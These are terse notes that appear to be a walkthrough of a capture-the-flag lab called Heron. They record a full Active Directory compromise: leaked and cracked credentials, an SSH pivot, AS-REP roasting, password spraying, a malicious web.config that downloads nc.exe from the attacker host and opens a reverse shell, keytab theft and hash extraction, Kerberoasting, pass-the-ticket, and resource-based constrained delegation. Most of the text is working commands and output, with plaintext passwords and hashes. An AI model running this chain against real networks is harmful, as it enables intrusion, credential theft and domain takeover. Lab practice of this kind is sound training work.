- Leak creds : 
``pentest Heron123!``

- Two users : 
```sh
svc-web-accounting-d
svc-web-accounting
```

- Pivot :
```sh
ssh -R1080: pentest@10.8.3.12 -N
```
- Port 80 open on the DC :
```sh
##### Wayne Wood
CEO

Email: wayne.wood@heron.vl

##### Julian Pratt
Head of IT

Email: julian.pratt@heron.vl

##### Samuel Davies
Accounting

Email: samuel.davies@heron.vl
```

```sh
svc-web-accounting-d
svc-web-accounting
wayne.wood
julian.pratt
samuel.davies
```

- Aesproasting :
```sh
proxychains GetNPUsers.py heron.vl/ -usersfile users -format hashcat -outputfile hashes.asreproast

$krb5asrep$23$samuel.davies@HERON.VL:0dbfbcec40448e526154055d25c166c7$343f5ceb6d39b584689f511a9dcf9aacdcdf6df6fa41710a8337f1f9e5aba024d7c6f1d51cac5136562e158f93c841f60b79736f256cab8e8ffda8fc65d102e1393f6119a067793d02983d797d012298e7df2fdd9f19e457c2107a6a22234bef0481a76cf3931e4603cba6b93ac1d43c88d3793cb97c5a7ee738e8299a8a19511ebccfbd71092f2170e35daddd39244151680fb5661afe79d5fdca7389df1538bbea67c2dac8a2cffc0ebdb19d3c83f3b2712f3529bb1c442087bfaf2706e1b84aba0a5e8caedb3c0684b4bdd5279c89323ec85a2f034fe9982b26ba9b06f595a23d1199

john --wordlist=/usr/share/wordlists/rockyou.txt  hashes.asreproast

samuel.davies : l6fkiy9oN 
```

- Creds 
```sh
Password: H3r0n2024#!
action: U
newName: _local
fullName:
description: local administrator
hangeLogon: 0
noChange: 0
neverExpires: 1
acctDisabled: 0
subAuthority: RID_ADMIN
userName: Administrator (built-in)
```

```sh
proxychains -q nxc smb 10.10.168.101 -u users -p 'H3r0n2024#!'
SMB         10.10.168.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
SMB         10.10.168.101   445    MUCDC            [+] heron.vl\svc-web-accounting-d:H3r0n2024#!
```

SMB : 
```sh
proxychains -q netexec smb 10.10.252.149 -u svc-web-accounting-d -p 'H3r0n2024#!' --shares
smbclient.py heron.vl/svc-web-accounting-d:'H3r0n2024#!'@10.10.168.101
#write access on accounting$ share
```
- RCE with web.config : 
```sh
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <location path="." inheritInChildApplications="false">
        <system.webServer>
            <handlers>
                <add name="aspNetCore" path="toto" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
            </handlers>
            <aspNetCore processPath='cmd.exe'
                        arguments='/c curl http://10.8.3.12:8080/nc.exe > nc.exe'
                        stdoutLogEnabled="false"
                        stdoutLogFile=".\logs\stdout"
                        hostingModel="OutOfProcess" />
        </system.webServer>
    </location>
</configuration>


<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <location path="." inheritInChildApplications="false">
        <system.webServer>
            <handlers>
                <add name="aspNetCore" path="toto" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
            </handlers>
            <aspNetCore processPath='cmd.exe'
                        arguments='/c nc.exe 10.8.3.12 4242 -e cmd'
                        stdoutLogEnabled="false"
                        stdoutLogFile=".\logs\stdout"
                        hostingModel="OutOfProcess" />
        </system.webServer>
    </location>
</configuration>

proxychains -q curl --ntlm -u heron\\svc-web-accounting-d:'H3r0n2024#!' http://accounting.heron.vl:80/toto -vv
```

Flag : VL{8f0f33fd2d2bad2152564ae5306daf70}

- Password Lonting :
```sh
C:\Windows\script\ssh.ps1

[server] sliver (UGLY_KAZOO) > cat ssh.ps1

$plinkPath = "C:\Program Files\PuTTY\plink.exe"
$targetMachine = "frajmp"
$user = "_local"
$password = "Deplete5DenialDealt"
& "$plinkPath" -ssh -batch $user@$targetMachine -pw $password "ps auxf; ls -lah /home; exit"
```

```sh
su root
cat /etc/krb5.keytab | base64

BQIAAAA2AAEACEhFUk9OLlZMAAdGUkFKTVAkAAAAAWZhxFECABcAEG9Vs7RD7xksgEsq6Y6CVPcA
AAACAAAANgABAAhIRVJPTi5WTAAHRlJBSk1QJAAAAAFmYcRRAgARABDcquoM3ER17um/eOamy9DN
AAAAAgAAAEYAAQAISEVST04uVkwAB0ZSQUpNUCQAAAABZmHEUQIAEgAge+ROYuJLpfSlAkwYWt4M
0wVrYAu5xp8R2jBQ3VhhMOcAAAACAAAAOwACAAhIRVJPTi5WTAAEaG9zdAAGRlJBSk1QAAAAAWZh
xFECABcAEG9Vs7RD7xksgEsq6Y6CVPcAAAACAAAAOwACAAhIRVJPTi5WTAAEaG9zdAAGRlJBSk1Q
AAAAAWZhxFECABEAENyq6gzcRHXu6b945qbL0M0AAAACAAAASwACAAhIRVJPTi5WTAAEaG9zdAAG
RlJBSk1QAAAAAWZhxFECABIAIHvkTmLiS6X0pQJMGFreDNMFa2ALucafEdowUN1YYTDnAAAAAgAA
AEQAAgAISEVST04uVkwABGhvc3QAD2ZyYWptcC5oZXJvbi52bAAAAAFmYcRRAgAXABBvVbO0Q+8Z
LIBLKumOglT3AAAAAgAAAEQAAgAISEVST04uVkwABGhvc3QAD2ZyYWptcC5oZXJvbi52bAAAAAFm
YcRRAgARABDcquoM3ER17um/eOamy9DNAAAAAgAAAFQAAgAISEVST04uVkwABGhvc3QAD2ZyYWpt
cC5oZXJvbi52bAAAAAFmYcRRAgASACB75E5i4kul9KUCTBha3gzTBWtgC7nGnxHaMFDdWGEw5wAA
AAIAAABIAAIACEhFUk9OLlZMABFSZXN0cmljdGVkS3JiSG9zdAAGRlJBSk1QAAAAAWZhxFECABcA
EG9Vs7RD7xksgEsq6Y6CVPcAAAACAAAASAACAAhIRVJPTi5WTAARUmVzdHJpY3RlZEtyYkhvc3QA
BkZSQUpNUAAAAAFmYcRRAgARABDcquoM3ER17um/eOamy9DNAAAAAgAAAFgAAgAISEVST04uVkwA
EVJlc3RyaWN0ZWRLcmJIb3N0AAZGUkFKTVAAAAABZmHEUQIAEgAge+ROYuJLpfSlAkwYWt4M0wVr
YAu5xp8R2jBQ3VhhMOcAAAACAAAAUQACAAhIRVJPTi5WTAARUmVzdHJpY3RlZEtyYkhvc3QAD2Zy
YWptcC5oZXJvbi52bAAAAAFmYcRRAgAXABBvVbO0Q+8ZLIBLKumOglT3AAAAAgAAAFEAAgAISEVS
T04uVkwAEVJlc3RyaWN0ZWRLcmJIb3N0AA9mcmFqbXAuaGVyb24udmwAAAABZmHEUQIAEQAQ3Krq
DNxEde7pv3jmpsvQzQAAAAIAAABhAAIACEhFUk9OLlZMABFSZXN0cmljdGVkS3JiSG9zdAAPZnJh
am1wLmhlcm9uLnZsAAAAAWZhxFECABIAIHvkTmLiS6X0pQJMGFreDNMFa2ALucafEdowUN1YYTDn
AAAAAg==
```

Extract hash : 
```sh
python3 keytabextract.py krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HERON.VL
        SERVICE PRINCIPAL : FRAJMP$/
        NTLM HASH : 6f55b3b443ef192c804b2ae98e8254f7
        AES-256 HASH : 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7
        AES-128 HASH : dcaaea0cdc4475eee9bf78e6a6cbd0cd
```

Flag : VL{5112c412c73712e84fc3d01a30298760}

Kerberoasting : 

```sh
proxychains -q GetUserSPNs.py -no-preauth "samuel.davies" -usersfile user.txt -dc-host "10.10.168.101" "dc.heron.vl"/
proxychains -q nxc ldap 10.10.168.101 -u svc-web-accounting-d -p 'H3r0n2024#!' --kerberoasting output.txt
```

More Looting  :

```sh
proxychains -q nxc smb mucdc.heron.vl -u user.txt -p 'Deplete5DenialDealt' --continue-on-success
[+] heron.vl\Julian.Pratt:Deplete5DenialDealt

proxychains -q getTGT.py 'heron.vl'/'Julian.Pratt':'Deplete5DenialDealt' -dc-ip 10.10.254.53
ticketConverter.py Julian.Pratt.ccache Julian.Pratt.kirbi

.\Rubeus.exe ptt /ticket:Julian.Pratt.kirbi
dir \\mucdc.heron.vl\C$\Users\julian.pratt\

cat mucjmp.lnk
adm_prju@mucjmp -pw ayDMWV929N9wAiB4
```

RBCD : 
```sh
rbcd.py -delegate-from 'FRAJMP$' -delegate-to 'mucdc' -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'

proxychains -q getST.py -spn 'cifs/mucdc.heron.vl' -impersonate '_admin' 'heron.vl/FRAJMP$' -hashes :6f55b3b443ef192c804b2ae98e8254f7 -debug
export KRB5CCNAME=_admin.ccache
proxychains -q netexec smb 10.10.254.53 --use-kcache -x "type C:\Users\Administrator\Desktop\root.txt"
```

